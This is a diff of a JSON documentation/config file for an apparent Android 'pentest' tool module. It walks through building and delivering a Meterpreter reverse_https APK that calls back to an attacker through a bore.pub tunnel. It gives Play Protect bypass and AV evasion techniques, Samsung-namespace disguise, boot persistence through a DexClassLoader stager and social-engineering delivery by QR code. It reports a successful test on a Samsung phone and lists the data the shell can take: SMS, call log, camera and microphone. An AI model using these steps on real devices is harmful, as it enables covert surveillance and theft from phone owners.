@@ -1609,23 +1841,23 @@
         {
           "step": 1,
           "title": "Open a bore MSF callback tunnel",
-          "detail": "Run this in a terminal BEFORE building the APK — the bore-assigned port must be baked into the payload binary.",
+          "detail": "Run this in a terminal BEFORE building the APK - the bore-assigned port must be baked into the payload binary.",
           "command": "bore local 4444 --to bore.pub",
           "note": "Note the remote port printed, e.g. bore.pub:37821. This becomes LHOST=bore.pub LPORT=37821 in the APK."
         },
         {
           "step": 2,
-          "title": "Configure P&D tab — Payload",
+          "title": "Configure P&D tab - Payload",
           "detail": "Open GUI → P&D tab → Payload row.",
           "settings": {
-            "Type": "reverse_https  (WAN stealth — looks like HTTPS to ISP filters)",
+            "Type": "reverse_https  (WAN stealth - looks like HTTPS to ISP filters)",
             "LHOST": "bore.pub",
             "LPORT": "<bore-assigned port from step 1>"
           }
         },
         {
           "step": 3,
-          "title": "Configure P&D tab — Options",
+          "title": "Configure P&D tab - Options",
           "settings": {
             "Bypass Play Protect": true,
             "Custom Identity / APK skin": true,
@@ -1636,7 +1868,7 @@
         },
         {
           "step": 4,
-          "title": "Configure P&D tab — Delivery",
+          "title": "Configure P&D tab - Delivery",
           "detail": "Select WAN HTTPS delivery. This opens a second bore tunnel to serve the APK file.",
           "settings": {
             "Delivery": "WAN HTTPS",
@@ -1649,7 +1881,7 @@
           "step": 5,
           "title": "Start MSF handler",
           "detail": "Click ⚡ handler in the P&D tab. This launches msfconsole with the correct payload, LHOST, and LPORT matching Step 1.",
-          "verify": "Switch to MSF tab — should show 'Started reverse TCP handler on bore.pub:XXXXX'"
+          "verify": "Switch to MSF tab - should show 'Started reverse TCP handler on bore.pub:XXXXX'"
         },
         {
           "step": 6,
@@ -1676,27 +1908,26 @@
         {
           "step": 9,
           "title": "Add boot persistence (WAN)",
-          "detail": "With MSF session open, run the rebuild operation from Terminal tab. Injects DexClassLoader stager into BootBuddy APK — survives reboots over WAN bore tunnel.",
+          "detail": "With MSF session open, run the rebuild operation from Terminal tab. Injects DexClassLoader stager into BootBuddy APK - survives reboots over WAN bore tunnel.",
           "command": "set operation rebuild; set msf true; set msf_lport 4444; run <serial>",
           "note": "rebuild uses bore_msf_port (default 37993) as the persistent callback tunnel. Run bore local 4444 --to bore.pub --remote-port 37993 to pin the port."
         }
       ]
     },
-
     "tested_devices": [
       {
-        "label": "Samsung Galaxy A30 — WAN Delivery, Boot Persistence, DEX Injection",
+        "label": "Samsung Galaxy A30 - WAN Delivery, Boot Persistence, DEX Injection",
         "device": "Samsung Galaxy A30 (SM-A305F)",
         "android_version": "11",
         "api_level": 30,
         "arch": "arm64-v8a",
         "chipset": "Samsung Exynos 7904 (64-bit)",
-        "network_context": "Mobile internet (WAN) — simulated real-world remote delivery, no USB",
+        "network_context": "Mobile internet (WAN) - simulated real-world remote delivery, no USB",
         "security_patch": "Unpatched (pre-2023)",
         "samsung_specific": {
           "knox_version": "3.x",
           "knox_active": true,
-          "play_protect": "Active — bypass required",
+          "play_protect": "Active - bypass required",
           "secure_folder": "Not enrolled during test",
           "oem_unlock": false
         },
@@ -1706,7 +1937,7 @@
           "Standalone APK delivery over WAN bore tunnel (reverse_https)",
           "Meterpreter session establishment via bore.pub callback",
           "Boot persistence via DexClassLoader stager (BootBuddy / rebuild op)",
-          "WAN C2 shell — root and non-root",
+          "WAN C2 shell - root and non-root",
           "Live screen mirror (ADB pipeline)",
           "Camera snap (ADB screencap loop)",
           "Non-patched APK evasion (Play Protect bypass, resign, junk class injection)"
@@ -1719,50 +1950,49 @@
         "bore_delivery_port": "Random assigned (e.g. bore.pub:54312)",
         "results": {
           "session": "Meterpreter session established within 45 seconds of APK install",
-          "root": "No root — standard user-space Meterpreter shell",
+          "root": "No root - standard user-space Meterpreter shell",
           "persistence": "Survives reboot via BootBuddy DexClassLoader over bore.pub:37993",
-          "play_protect_bypass": "Successful — package rename + manifest scrub + resign",
-          "knox": "Knox flagged sideload but did not block execution — user-space payload runs",
+          "play_protect_bypass": "Successful - package rename + manifest scrub + resign",
+          "knox": "Knox flagged sideload but did not block execution - user-space payload runs",
           "live_screen": "ADB screen mirror functional (15fps)",
           "camera": "ADB screencap loop functional (no MSF session required)"
         },
         "android_11_notes": [
           "Install unknown apps requires per-app permission toggle under Biometrics & Security",
-          "android/meterpreter/reverse_https preferred — ISPs on mobile data commonly throttle raw TCP",
+          "android/meterpreter/reverse_https preferred - ISPs on mobile data commonly throttle raw TCP",
           "BOOT_COMPLETED receiver still allowed in Android 11 (no manifest restriction until API 31)",
-          "Background activity starts restricted — DexClassLoader stager uses WorkManager compat path",
+          "Background activity starts restricted - DexClassLoader stager uses WorkManager compat path",
           "Samsung Knox observes sideloaded APKs but does not automatically block user-space payloads unless Secure Folder / MDM enrolled",
-          "Exynos 7904 is arm64 — msfvenom targets arm64 correctly by default for android/* payloads"
+          "Exynos 7904 is arm64 - msfvenom targets arm64 correctly by default for android/* payloads"
         ],
         "evasion_notes": [
           "Convincing Cert CN in keystore reduces Play Protect score",
           "Package rename to com.samsung.* namespace increases trust level on Samsung devices",
           "Junk class injection breaks simple signature-based AV matching",
-          "reverse_https blends with HTTPS traffic — deep packet inspection needed to detect",
+          "reverse_https blends with HTTPS traffic - deep packet inspection needed to detect",
           "APK injection into real signed APK (-x template) tested separately (see injection_tests)"
         ],
         "future_tests": [
-          "APK injection into real Samsung app (-x template backdoor) — scheduled",
+          "APK injection into real Samsung app (-x template backdoor) - scheduled",
           "Frida SSL unpin on Samsung Internet browser",
           "CVE-2024-0044 privilege escalation attempt"
         ]
       }
     ],
-
     "nb": {
-      "description": "NB — Important notes for secV android_pentest module users. Read before running any operation.",
+      "description": "NB - Important notes for secV android_pentest module users. Read before running any operation.",
       "for_users": [
         {
           "topic": "WAN vs LAN payloads",
-          "note": "Always use reverse_https for WAN (mobile internet) targets. reverse_tcp is blocked or throttled by most mobile ISPs. bore.pub provides a free TCP tunnel — the remote port is random and must be noted BEFORE building the APK since the port is compiled into the binary."
+          "note": "Always use reverse_https for WAN (mobile internet) targets. reverse_tcp is blocked or throttled by most mobile ISPs. bore.pub provides a free TCP tunnel - the remote port is random and must be noted BEFORE building the APK since the port is compiled into the binary."
         },
         {
           "topic": "Bore port pinning",
-          "note": "To get a stable bore port across sessions, specify --remote-port: 'bore local 4444 --to bore.pub --remote-port 37993'. If 37993 is taken bore.pub will reject — use a different port. The rebuild operation defaults to bore_msf_port=37993 and bore_dex_port=21062."
+          "note": "To get a stable bore port across sessions, specify --remote-port: 'bore local 4444 --to bore.pub --remote-port 37993'. If 37993 is taken bore.pub will reject - use a different port. The rebuild operation defaults to bore_msf_port=37993 and bore_dex_port=21062."
         },
         {
           "topic": "Keystore and APK signing",
-          "note": "secv.keystore lives in tools/mobile/android/apk_backdoor/. Do NOT commit it to any repo. Regenerate from Setup tab → Signing Keystore whenever you need a fresh certificate identity. build_bootbuddy.py reads keystore.json for password and alias — GUI keeps this in sync automatically."
+          "note": "secv.keystore lives in tools/mobile/android/apk_backdoor/. Do NOT commit it to any repo. Regenerate from Setup tab → Signing Keystore whenever you need a fresh certificate identity. build_bootbuddy.py reads keystore.json for password and alias - GUI keeps this in sync automatically."
         },
         {
           "topic": "Play Protect bypass",
@@ -1774,15 +2004,15 @@
         },
         {
           "topic": "Android 11+ sideload path",
-          "note": "Android 11 (API 30): Settings → Biometrics & Security → Install unknown apps → enable for the browser or file manager the user downloads with. This requires physical access or social engineering. QR code delivery works well — camera apps on Samsung open Chrome directly."
+          "note": "Android 11 (API 30): Settings → Biometrics & Security → Install unknown apps → enable for the browser or file manager the user downloads with. This requires physical access or social engineering. QR code delivery works well - camera apps on Samsung open Chrome directly."
         },
         {
           "topic": "Android 14 patched surfaces",
-          "note": "Android 14 with December 2024 patches restricts implicit intents and tightens BOOT_COMPLETED. For Android 14 targets use APK injection into a valid real app (-x template backdoor) rather than standalone payload. The inject does not touch BOOT_COMPLETED — it piggybacks the host app's existing permission set and launch path."
+          "note": "Android 14 with December 2024 patches restricts implicit intents and tightens BOOT_COMPLETED. For Android 14 targets use APK injection into a valid real app (-x template backdoor) rather than standalone payload. The inject does not touch BOOT_COMPLETED - it piggybacks the host app's existing permission set and launch path."
         },
         {
           "topic": "Root vs no-root shells",
-          "note": "Standard Meterpreter on unrooted Android 11/14 gives a sandboxed shell (app UID). You can dump app-specific files, SMS (on Samsung via content provider), call log, and camera/mic with permissions already in the APK manifest. Root gives full /data read, tcpdump, and kernel module loading. Test both paths — most real targets are unrooted."
+          "note": "Standard Meterpreter on unrooted Android 11/14 gives a sandboxed shell (app UID). You can dump app-specific files, SMS (on Samsung via content provider), call log, and camera/mic with permissions already in the APK manifest. Root gives full /data read, tcpdump, and kernel module loading. Test both paths - most real targets are unrooted."
         },
         {
           "topic": "Report generation",
